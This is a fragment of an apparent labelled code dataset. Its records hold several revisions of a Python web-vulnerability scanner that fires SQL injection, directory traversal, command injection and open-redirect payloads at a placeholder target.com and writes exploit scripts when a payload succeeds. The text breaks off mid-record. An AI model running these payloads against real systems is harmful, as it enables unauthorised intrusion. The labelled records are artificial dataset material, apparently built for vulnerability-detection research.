     if not os.path.exists('D:' + file_path):\n                    return file_path\n                duplicate = 1\n                while duplicate < 101:\n                    new_path = re.sub(r'\\.(.*?)$', ' (%d).\\\\1' % duplicate, file_path)\n                    if not os.path.exists('D:' + new_path):\n                        return new_path\n                    duplicate = duplicate + 1\n                return ''\n            file_path = get_non_duplicate_path(target_path + file_name)\n            if not file_path:\n                future.set_result('bzs_upload_failure')\n                return\n            # Committing changes to database\n            file_stream = open(file_path, 'wb')\n            file_stream.write(upload_data)\n            file_stream.close()\n            # Final return\n            future.set_result('bzs_upload_success')\n        tornado.ioloop.IOLoop.instance().add_callback(save_file_async,\n            self, target_path, file_name)\n\n        response_temp = yield future\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(response_temp)))\n        self.write(response_temp)\n        self.flush()\n        self.finish()\n        return self\n    pass\n/n/n/n", "label": 1}, {"id": "2b585ad33975d3f155fd07d76d0f503f6f38a7a7", "code": "payloads/inject.py/n/nimport requests\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\n\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n\tparsedURL = BASE_URL + url\t\n\thtml = \"\"\n\n\t\n\t#if get\n\tif method == \"GET\":\n\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n\t\tcontent = requests.get(getURL)\n\t\thtml =  content.text\n\n\t#if post\n\telif method == \"POST\":\n\t\tcontent = requests.post(parsedURL, data={paramname:payload[0]})\n\t\thtml = content.text\n\n\tresult = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n\t\n\t#if function returns:\n\tif result is not None:\n\t\tprint payload\n\t\t#generateExploit(parsedURL, method, paramname, payload)\n\t\treturn payload\n\treturn None\n\ndef timeid(full=False):\n\tif full==False:\n\t\treturn datetime.now().strftime(\"%S-%f\")\n\telse:\n\t\treturn datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n\tdirname = \"exploits/\"\n\tif not os.path.exists(dirname):\n\t\tos.makedirs(dirname)\n\n\tcopy(\"exploit.py\", dirname)\n\n\tf = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n\tf.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n\t\n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n\tif v == True:\n\t\tprint html\n\n\t#===== check for directory traversal =====\n\tif attackType == directory_traversal:\n\t\tmatch = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#======= check for shell command injection ======\n\tif attackType == shell_command:\n\t\tmatch = re.findall(r'GNU/Linux', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#===== check for sql_injection ======\n\tif attackType == sql_injection:\n\t\t\n\t\tfalsePayload = sqli.get_false()\n\t\t#if get\n\t\tif method == \"GET\":\n\t\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+falsePayload\n\t\t\tcontent = requests.get(getURL)\n\t\t\tbadhtml =  content.text\n\t\t#if post\n\t\telif method == \"POST\":\n\t\t\tcontent = requests.post(url, data={paramname:falsePayload})\n\t\t\tbadhtml = content.text\n\n\t\tcompare_res = sqli.compare_html(badhtml, html)\t\t\n\t\tmatch = re.findall(r'<ins>.+', compare_res)\n\t\tif len(match) ==0 :\n\t\t\treturn None\n\t\treturn match\n\n\t#====== check for open_redirect=======\n\tif attackType == open_redirect:\n\t\tif len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n\t\t\treturn True\n\n\t\n\t#=======check for server_injection ====\n\tif attackType == server_injection:\n\t\t#included index.php\n\t\tindexPHP = requests.get(BASE_URL + \"/index.php\")\n\n\t\tif indexPHP.text in html:\n\t\t\treturn attackType\n\t\t#uname -a successful:\n\t\tif \"GNU/Linux\" in html:\n\t\t\treturn attackType\n\n\treturn None;\n\t\n\nif __name__ == \"__main__\":\n\t## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n\t# ## test shell command\n\t# ## post in the form\n\t# url = \"/commandinjection/commandinjection.php\"\n\t# payloads = cmd.get_all()\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"host\", 'POST', payload)\n\n\t#sqli\n\t# post in the form\n\turl = \"/sqli/sqli.php\"\n\tpayloads = sqli.get_all()\n\tfor payload in payloads:\n\t\tinjectPayload(url, \"username\", \"POST\", payload)\n\n\t#Test for server side code injection\n\t# url = \"/serverside/eval2.php\"\n\t# payloads = ssci.get_all(url)\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"page\", \"POST\", payload)\n\t'''\n\t#test for open redirect\n\turl = \"/openredirect/openredirect.php\"\n\torPayload = oRedirect.get_all()\n\tfor payload in orPayload:\n\t \tinjectPayload(url, \"redirect\", \"GET\", payload)\n\t'''\n/n/n/npayloads/sqli.py/n/nimport difflib\n\ndef get_false():\n\tpayloads = [\"' and ' 1=2\"]\n\treturn payloads\n\ndef get_all():\n\t\"\"\"\n\tConsider different db types and versions\n\t-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite\n\t' OR '1'='1' --\n\t' OR '1'='1' /*\n\t-- MySQL\n\t' OR '1'='1' #\n\t-- Access (using null characters)\n\t' OR '1'='1' %00\n\t' OR '1'='1' %16\n\t\"\"\"\n\tpayloads = [\"' or '1=1\", \"' or 1=1--\", \"'=1\\' or \\'1\\' = \\'1\\'\", \"'1 'or' 1 '=' 1\", \"'or 1=1#\", \"' OR '1'='1' --\", \"' OR '1'='1' %00\"]\n\tpayloads = [(item, \"SQL Injection\") for item in payloads]\n\treturn payloads\t\n\ndef compare_html(html1, html2):\n\tdiff_html = \"\"\n\tdiffs = difflib.ndiff(html1.splitlines(), html2.splitlines())\n\tfor ele in diffs:\n\t\tif (ele[0] == \"-\"):\n\t\t\tdiff_html += \"<del>%s</del>\" % ele[1:].strip()\n\t\telif(ele[0] == \"+\"):\n\t\t\tdiff_html += \"<ins>%s</ins>\" %ele[1:].strip()\n\n\treturn diff_html\n\nif __name__ == \"__main__\":\t\n\tprint get_all()\n/n/n/n", "label": 0}, {"id": "2b585ad33975d3f155fd07d76d0f503f6f38a7a7", "code": "/payloads/inject.py/n/nimport requests\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\n\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n\tparsedURL = BASE_URL + url\t\n\thtml = \"\"\n\n\t\n\t#if get\n\tif method == \"GET\":\n\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n\t\tcontent = requests.get(getURL)\n\t\thtml =  content.text\n\n\t#if post\n\telif method == \"POST\":\n\t\tcontent = requests.post(parsedURL, data={paramname:payload[0]})\n\t\thtml = content.text\n\n\tresult = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n\t\n\t#if function returns:\n\tif result is not None:\n\t\tprint payload\n\t\t#generateExploit(parsedURL, method, paramname, payload)\n\t\treturn payload\n\treturn None\n\ndef timeid(full=False):\n\tif full==False:\n\t\treturn datetime.now().strftime(\"%S-%f\")\n\telse:\n\t\treturn datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n\tdirname = \"exploits/\"\n\tif not os.path.exists(dirname):\n\t\tos.makedirs(dirname)\n\n\tcopy(\"exploit.py\", dirname)\n\n\tf = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n\tf.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n\t\n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n\tif v == True:\n\t\tprint html\n\n\t#===== check for directory traversal =====\n\tif attackType == directory_traversal:\n\t\tmatch = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#======= check for shell command injection ======\n\tif attackType == shell_command:\n\t\tmatch = re.findall(r'GNU/Linux', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#===== check for sql_injection ======\n\tif attackType == sql_injection:\n\t\t\n\t\tfalsePayload = sqli.get_false()\n\t\t#if get\n\t\tif method == \"GET\":\n\t\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+falsePayload\n\t\t\tcontent = requests.get(getURL)\n\t\t\tbadhtml =  content.text\n\t\t#if post\n\t\telif method == \"POST\":\n\t\t\tcontent = requests.post(url, data={paramname:falsePayload})\n\t\t\tbadhtml = content.text\n\n\t\tcompare_res = sqli.compare_html(badhtml, html)\t\t\n\t\tmatch = re.findall(r'<ins>.+', compare_res)\n\t\tif len(match) ==0 :\n\t\t\treturn None\n\t\treturn match\n\n\t#====== check for open_redirect=======\n\tif attackType == open_redirect:\n\t\tif len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n\t\t\treturn True\n\n\t\n\t#=======check for server_injection ====\n\tif attackType == server_injection:\n\t\t#included index.php\n\t\tindexPHP = requests.get(BASE_URL + \"/index.php\")\n\n\t\tif indexPHP.text in html:\n\t\t\treturn attackType\n\t\t#uname -a successful:\n\t\tif \"GNU/Linux\" in html:\n\t\t\treturn attackType\n\n\treturn None;\n\t\n\nif __name__ == \"__main__\":\n\t## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n\t# ## test shell command\n\t# ## post in the form\n\t# url = \"/commandinjection/commandinjection.php\"\n\t# payloads = cmd.get_all()\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"host\", 'POST', payload)\n\n\t#sqli\n\t# post in the form\n\t#url = \"/sqli/sqli.php\"\n\t#payloads = sqli.get_all()\n\t#for payload in payloads:\n\t#\tinjectPayload(url, \"username\", \"POST\", payload)\n\n\t#Test for server side code injection\n\turl = \"/serverside/eval2.php\"\n\tpayloads = ssci.get_all(url)\n\tfor payload in payloads:\n\t\tinjectPayload(url, \"page\", \"POST\", payload)\n\t'''\n\t#test for open redirect\n\turl = \"/openredirect/openredirect.php\"\n\torPayload = oRedirect.get_all()\n\tfor payload in orPayload:\n\t \tinjectPayload(url, \"redirect\", \"GET\", payload)\n\t'''\n/n/n/n/payloads/sqli.py/n/nimport difflib\n\ndef get_false():\n\tpayloads = [\"' and ' 1=2\"]\n\treturn payloads\n\ndef get_all():\n\tpayloads = [\"' or '1=1\"]\n\tpayloads = [(item, \"SQL Injection\") for item in payloads]\n\treturn payloads\t\n\ndef compare_html(html1, html2):\n\tdiff_html = \"\"\n\tdiffs = difflib.ndiff(html1.splitlines(), html2.splitlines())\n\tfor ele in diffs:\n\t\tif (ele[0] == \"-\"):\n\t\t\tdiff_html += \"<del>%s</del>\" % ele[1:].strip()\n\t\telif(ele[0] == \"+\"):\n\t\t\tdiff_html += \"<ins>%s</ins>\" %ele[1:].strip()\n\n\treturn diff_html\n\nif __name__ == \"__main__\":\t\n\tprint get_all()\n/n/n/n", "label": 1}, {"id": "72f5292f0edc0c86f86d6c7f1bbca6d7bd3a04b3", "code": "payloads/inject.py/n/nimport requests\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\n\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\ndef injectPayload(url, method, paramname, payload, verbose = False):\n\tparsedURL = BASE_URL + url\t\n\thtml = \"\"\n\n\t#if get\n\tif method == \"GET\":\n\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n\t\tcontent = requests.get(getURL)\n\t\thtml =  content.text\n\n\t#if post\n\telif method == \"POST\":\n\t\tcontent = requests.post(parsedURL, data={paramname:payload[0]})\n\t\thtml = content.text\n\n\n\tresult = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n\t\n\t#if function returns:\n\tif result is not None:\n\t\tprint(url, payload)\n\t\t#generateExploit(parsedURL, method, paramname, payload)\n\t\treturn True\n\treturn None\n\ndef timeid(full=False):\n\tif full==False:\n\t\treturn datetime.now().strftime(\"%S-%f\")\n\telse:\n\t\treturn datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n\tdirname = \"exploits/\"\n\tif not os.path.exists(dirname):\n\t\tos.makedirs(dirname)\n\n\tcopy(\"exploit.py\", dirname)\n\n\tf = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n\tf.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n\t\n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n\tif v == True:\n\t\tprint html\n\n\t#===== check for directory traversal =====\n\tif attackType == directory_traversal:\n\t\tmatch = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#======= check for shell command injection ======\n\tif attackType == shell_command:\n\t\tmatch = re.findall(r'GNU/Linux', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#===== check for sql_injection ======\n\t\"\"\"\n\t# if attackType == sql_injection:\n\t\t\n\t# \tfalsePayload = sqli.get_false()[0]\n\t# \tbadhtml = \"\"\n\t# \t#if get\n\t# \tif method == \"GET\":\n\t# \t\tgetURL = url + \"?\" + paramname+\"=\"+falsePayload\n\t# \t\tcontent = requests.get(getURL)\n\t# \t\tbadhtml =  content.text\n\t# \t#if post\n\t# \telif method == \"POST\":\n\t# \t\tcontent = requests.post(url, data={paramname:falsePayload})\n\t# \t\tbadhtml = content.text\n\n\t# \tcompare_res = sqli.compare_html(badhtml, html)\t\t\n\t# \tmatch = re.findall(r'<ins>.+', compare_res)\n\t# \tif len(match) ==0 :\n\t# \t\treturn None\n\t# \treturn None\n\t\"\"\"\n\t# Add another true page to remove false positive\n\t# Commented for now\n\tif attackType == sql_injection:\n\t\t## for real sql injection, the payloads should return the same result\n\t\t## then compare the fake page with the true page to see the difference\n\t\tfalsePayloads = sqli.get_false()\n\t\tbadhtml = []\n\t\tfor falsePayload in falsePayloads:\n\t\t\t#if get\n\t\t\tif method == \"GET\":\n\t\t\t\tgetURL = url + \"?\" + paramname+\"=\"+falsePayload\n\t\t\t\tfalse_page = requests.get(getURL)\n\t\t\t\tif(false_page.status_code==200):\n\t\t\t\t\tbadhtml.append(false_page.text)\n\t\t\t\telse:\n\t\t\t\t\tbadhtml.append(requests.get(url).text)\n\t\t\t#if post\n\t\t\telif method == \"POST\":\n\t\t\t\tfalse_page = requests.post(url, data={paramname:falsePayload})\n\t\t\t\tif(false_page.status_code==200):\n\t\t\t\t\tbadhtml.append(false_page.text)\n\t\t\t\t\t# print(html)\n\t\t\t\telse:\n\t\t\t\t\tbadhtml.append(requests.get(url).text)\n\n\t\tif(content.status_code==200) and badhtml[1]==html:\n\t\t\tcompare_res = sqli.compare_html(badhtml[0], html)  \n\t\t\tmatch = re.findall(r'<ins>.+', compare_res)\n\n\t\telse:\n\t\t\tmatch = \"\"\n\t\tif len(match) ==0 :\n\t\t\treturn None\n\n\t\treturn match\n\n\n\t#====== check for open_redirect=======\n\tif attackType == open_redirect:\n\t\tif len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n\t\t\treturn True\n\n\t\n\t#=======check for server_injection ====\n\tif attackType == server_injection:\n\t\t#included index.php\n\t\tindexPHP = requests.get(BASE_URL + \"/index.php\")\n\n\t\tif indexPHP.text in html:\n\t\t\treturn attackType\n\t\t#uname -a successful:\n\t\tif \"GNU/Linux\" in html:\n\t\t\treturn attackType\n\n\treturn None;\n\t\ndef get_payloads(v=False):\n\tpayloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n\tif v == True:\n\t\tfor p in payloads:\n\t\t\tprint p[0]\n\n\treturn payloads\n\n\nif __name__ == \"__main__\":\n\t# get_payloads(v=True)\n\n\t\n\t## check all pages\n\tpayloads = get_payloads()\n\turl_list = ['/directorytraversal/directorytraversal.php',\n\t\t\t\t\"/commandinjection/commandinjection.php\",\n\t\t\t\t\"/sqli/sqli.php\",\n\t\t\t\t\"/serverside/eval2.php\",\n\t\t\t\t\"/openredirect/openredirect.php\"]\n\tfor payload in payloads:\n\t\tinjectPayload(url_list[0],  'GET','ascii', payload)\n\t\tinjectPayload(url_list[1], 'POST', \"host\", payload)\n\t\tinjectPayload(url_list[2],  \"POST\", \"username\", payload)\n\t\tinjectPayload(url_list[3],  \"POST\", \"page\", payload)\n\t\tinjectPayload(url_list[4],  \"GET\", \"redirect\", payload)\n\n\t\n\n\t## test directory shell\n\t# url = '/directorytraversal/directorytraversal.php'\n\t# payloads = dirtraversal.get_all()\n\n\t# for payload in payloads:\n\t#     ## need param after endpoint ?param=\n\t\t\n\t#     injectPayload(url, 'ascii', 'GET', payload)\n\n\n\t# ## test shell command\n\t# ## post in the form\n\t# url = \"/commandinjection/commandinjection.php\"\n\t# payloads = cmd.get_all()\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"host\", 'POST', payload)\n\n\t#sqli\n\t# post in the form\n\t#url = \"/sqli/sqli.php\"\n\t#payloads = sqli.get_all()\n\t#for payload in payloads:\n\t#\tinjectPayload(url, \"username\", \"POST\", payload)\n\n\t#Test for server side code injection\n\t# url = \"/serverside/eval2.php\"\n\t# payloads = ssci.get_all(url)\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"page\", \"POST\", payload)\n\t'''\n\t#test for open redirect\n\turl = \"/openredirect/openredirect.php\"\n\torPayload = oRedirect.get_all()\n\tfor payload in orPayload:\n\t\tinjectPayload(url, \"redirect\", \"GET\", payload)\n\t'''\n/n/n/npayloads/sqli.py/n/nimport difflib\n\n\"\"\"\nSolutions:\n1. compare pages only  \nmatch = re.findall(r'<pre>', html)\n\n2. add false page to compare\nmatch = re.findall(r'<ins>.+', compare_res)\n\n3. add another label \"' or '1'='1\" as ground truth\nAssumption: should be the same page for sql injection, different with false page\n\"\"\"\n\ndef get_false():\n\t## the second is taken as ground truth to filter out real sql-injection page\n\tpayloads = [\"' and '1=2\", \"' or '1'='1\"]\n\treturn payloads\n\n# def get_false():\n# \tpayloads = \"' and '1=2\"\n# \treturn payloads\n\ndef get_all():\n\t\"\"\"\n\tConsider different db types and versions\n\t-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite\n\t' OR '1'='1' --\n\t' OR '1'='1' /*\n\t-- MySQL\n\t' OR '1'='1' #\n\t-- Access (using null characters)\n\t' OR '1'='1' %00\n\t' OR '1'='1' %16\n\t\"\"\"\n\t## temp test\n\t# payloads = [\"' or '1=1\"]\n\tpayloads = [\"' or '1=1\",   \"'1 'or' 1'='1\",\"' or '1'='1\",  \"'or 1=1#\", \"' OR '1=1 %00\"]\n\tpayloads = [(item, \"SQL Injection\") for item in payloads]\n\treturn payloads\t\n\ndef compare_html(html1, html2):\n\tdiff_html = \"\"\n\tdiffs = difflib.ndiff(html1.splitlines(), html2.splitlines())\n\tfor ele in diffs:\n\t\tif (ele[0] == \"-\"):\n\t\t\tdiff_html += \"<del>%s</del>\" % ele[1:].strip()\n\t\telif(ele[0] == \"+\"):\n\t\t\tdiff_html += \"<ins>%s</ins>\" %ele[1:].strip()\n\n\treturn diff_html\n\nif __name__ == \"__main__\":\t\n\tprint get_all()\n/n/n/npayloads/test_inject.py/n/nimport requests\nimport json\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\nimport collections\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\nclass AutoDict(dict):\n    def __getitem__(self, item):\n        try:\n            return dict.__getitem__(self, item)\n        except KeyError:\n            value = self[item] = type(self)()\n            return value\n\nfinal_output=[]\nvul_list = []\nvul_classes = AutoDict()\n\ndef format_vul_list():\n    sorted_list = sorted(vul_list, key=lambda x: x[2][1])\n    print(sorted_list)\n\n## write to json file if possible\ndef write_file(url, paramname, payload, method):\n    ## initialize dict\n    sub_elements = AutoDict()\n    lists = []\n    sub_elements['endpoint']= url\n    sub_elements['params']['key1']= payload[0]\n    sub_elements['method'] = method\n    # update current dict\n    if(vul_classes.get('class')==payload[1]):\n        lists = vul_classes['results'][BASE_URL]\n\n        for ele in lists:\n            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :\n                continue\n            else:\n                lists.append(sub_elements)\n         \n        vul_classes['results'][BASE_URL]=lists\n\n    else:\n        vul_classes['class'] = payload[1]        \n        lists.append(sub_elements)\n        vul_classes['results'][BASE_URL]=lists\n\n\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n    parsedURL = BASE_URL + url  \n    html = \"\"\n\n    #if get\n    if method == \"GET\":\n        getURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n        content = requests.get(getURL)\n        html =  content.text\n\n    #if post\n    elif method == \"POST\":\n        content = requests.post(parsedURL, data={paramname:payload[0]})\n        html = content.text\n\n    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n    \n    #if function returns:\n    if result is not None:\n        print(url, payload)\n        vul_list.append([url, paramname, payload, method])\n\n        #generateExploit(parsedURL, method, paramname, payload)\n        return True\n    return None\n\ndef timeid(full=False):\n    if full==False:\n        return datetime.now().strftime(\"%S-%f\")\n    else:\n        return datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n    dirname = \"exploits/\"\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    copy(\"exploit.py\", dirname)\n\n    f = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n    f.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n    \n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n    if v == True:\n        print html\n\n    #===== check for directory traversal =====\n    if attackType == directory_traversal:\n        match = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #======= check for shell command injection ======\n    if attackType == shell_command:\n        match = re.findall(r'GNU/Linux', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #===== check for sql_injection ======\n    if attackType == sql_injection:\n        ## for real sql injection, the payloads should return the same result\n        ## then compare the fake page with the true page to see the difference\n        falsePayloads = sqli.get_false()\n        #if get\n        badhtml = []\n        for falsePayload in falsePayloads:\n            if method == \"GET\":\n                getURL = url + \"?\" + paramname+\"=\"+falsePayload\n                false_page = requests.get(getURL)\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                else:\n                    badhtml.append(requests.get(url).text)\n            #if post\n            elif method == \"POST\":\n                false_page = requests.post(url, data={paramname:falsePayload})\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                    # print(html)\n                else:\n                    badhtml.append(requests.get(url).text)\n\n        if(content.status_code==200) and badhtml[1]==html:\n            compare_res = sqli.compare_html(badhtml[0], html)  \n            match = re.findall(r'<ins>.+', compare_res)\n\n        else:\n            match = \"\"\n        if len(match) ==0 :\n            return None\n\n        return match\n\n    #====== check for open_redirect=======\n    if attackType == open_redirect:\n        if len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n            return True\n\n    \n    #=======check for server_injection ====\n    if attackType == server_injection:\n        #included index.php\n        indexPHP = requests.get(BASE_URL + \"/index.php\")\n\n        if indexPHP.text in html:\n            return attackType\n        #uname -a successful:\n        if \"GNU/Linux\" in html:\n            return attackType\n\n    return None;\n    \ndef get_payloads(v=False):\n    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n    if v == True:\n        for p in payloads:\n            print p[0]\n\n    return payloads\n\n\nif __name__ == \"__main__\":\n    # get_payloads(v=True)\n\n    payloads = sqli.get_all()\n    url_list = ['/directorytraversal/directorytraversal.php',\n                \"/commandinjection/commandinjection.php\",\n                \"/sqli/sqli.php\",\n                \"/serverside/eval2.php\",\n                \"/openredirect/openredirect.php\"]\n    for payload in payloads:\n        # injectPayload(url_list[0], 'ascii', 'GET', payload)\n        # injectPayload(url_list[1], \"host\", 'POST', payload)\n        injectPayload(url_list[2], \"username\", \"POST\", payload)\n        injectPayload(url_list[3], \"page\", \"POST\", payload)\n        injectPayload(url_list[4], \"redirect\", \"GET\", payload)\n\n    # with open('exploits/test.json', 'w') as f:\n    #     json.dump(final_output, f)\n\n    # format_lu_list()\n    ## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n    # ## test shell command\n    # ## post in the form\n    # url = \"/commandinjection/commandinjection.php\"\n    # payloads = cmd.get_all()\n    # for payload in payloads:\n    #   injectPayload(url, \"host\", 'POST', payload)\n\n    #sqli\n    # post in the form\n    #url = \"/sqli/sqli.php\"\n    #payloads = sqli.get_all()\n    #for payload in payloads:\n    #   injectPayload(url, \"username\", \"POST\", payload)\n\n    #Test for server side code injection\n    # url = \"/serverside/eval2.php\"\n    # payloads = ssci.get_all(url)\n    # for payload in payloads:\n    #   injectPayload(url, \"page\", \"POST\", payload)\n    '''\n    #test for open redirect\n    url = \"/openredirect/openredirect.php\"\n    orPayload = oRedirect.get_all()\n    for payload in orPayload:\n        injectPayload(url, \"redirect\", \"GET\", payload)\n    '''/n/n/n", "label": 0}, {"id": "72f5292f0edc0c86f86d6c7f1bbca6d7bd3a04b3", "code": "/payloads/inject.py/n/nimport requests\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\n\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\ndef injectPayload(url, method, paramname, payload, verbose = False):\n\tparsedURL = BASE_URL + url\t\n\thtml = \"\"\n\n\t#if get\n\tif method == \"GET\":\n\t\tgetURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n\t\tcontent = requests.get(getURL)\n\t\thtml =  content.text\n\n\t#if post\n\telif method == \"POST\":\n\t\tcontent = requests.post(parsedURL, data={paramname:payload[0]})\n\t\thtml = content.text\n\n\n\tresult = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n\t\n\t#if function returns:\n\tif result is not None:\n\t\t#generateExploit(parsedURL, method, paramname, payload)\n\t\treturn True\n\treturn None\n\ndef timeid(full=False):\n\tif full==False:\n\t\treturn datetime.now().strftime(\"%S-%f\")\n\telse:\n\t\treturn datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n\tdirname = \"exploits/\"\n\tif not os.path.exists(dirname):\n\t\tos.makedirs(dirname)\n\n\tcopy(\"exploit.py\", dirname)\n\n\tf = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n\tf.write(\"python exploit.py \" + 